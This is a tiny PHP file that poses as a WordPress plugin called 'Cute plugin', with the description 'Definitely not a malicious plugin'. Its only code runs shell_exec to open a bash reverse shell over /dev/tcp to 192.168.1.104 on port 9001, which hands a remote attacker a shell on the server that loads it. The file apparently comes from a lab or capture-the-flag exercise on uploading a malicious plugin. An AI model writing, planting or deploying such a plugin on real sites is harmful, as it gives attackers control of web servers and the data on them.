<?php
/**
* Plugin Name: Cute plugin
* Plugin URI: https://127.0.0.1:31337/pwn.php?cmd=whomai
* Description: Definitely not a malicious plugin.
* Version: 1337.0
* Author: Zeyad Abulaban & Omar Albalouli
* Author URI: https://hackers.org
*/
shell_exec("/bin/bash -c 'bash -i >& /dev/tcp/192.168.1.104/9001 0>&1'")
?>
